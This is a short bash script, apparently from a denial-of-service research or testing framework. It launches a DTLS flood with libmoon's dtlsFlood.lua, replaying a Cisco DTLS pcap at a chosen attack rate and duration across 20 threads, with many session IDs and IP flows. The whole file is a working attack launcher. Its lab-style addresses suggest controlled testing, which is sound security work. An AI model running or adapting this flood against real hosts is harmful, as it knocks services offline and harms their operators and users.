#!/bin/bash

# sudo script.sh <ipSrc> <ipDst> <attackRate> <duration> [more args]
# e.g.
# sudo bash dtlsFlood.sh 172.31.116.132 172.31.116.137 1000 10 dtls_cisco.pcap 1000000 128

# cd to directory of script
scriptDir=$(dirname -- "$(readlink -f -- "$BASH_SOURCE")")
cd "$scriptDir"

# prepare Flood Generator framework
source ../prepFloodGenerator.sh

############## Flood Configuration ##############

ipSrc=$1
ipDst=$2
attackRate=$3
seconds=$4

pcap=$5
sidCount=$6 # number of initiator SID numbers to be used in the attack
flows=$7

# more fixed configuration values (adjust if needed)
ethSrc="3c:fd:fe:9e:8e:39"
udpSrc=443

ethDst="b0:aa:77:2f:ab:1a"
udpDst=443


############## Flood Start ##############

$libmoonBuild/libmoon dtlsFlood.lua \
    --seconds $seconds --threads 20 --rate $attackRate \
    --replayPcap $pcap \
    --sessionIDCount $sidCount --ipFlows $flows\
    --ethSrc $ethSrc --ip4Src $ipSrc --udpSrc $udpSrc \
    --ethDst $ethDst --ip4Dst $ipDst --udpDst $udpDst \
    --startConfirmation \
    --outputDevStats stats.txt \
    0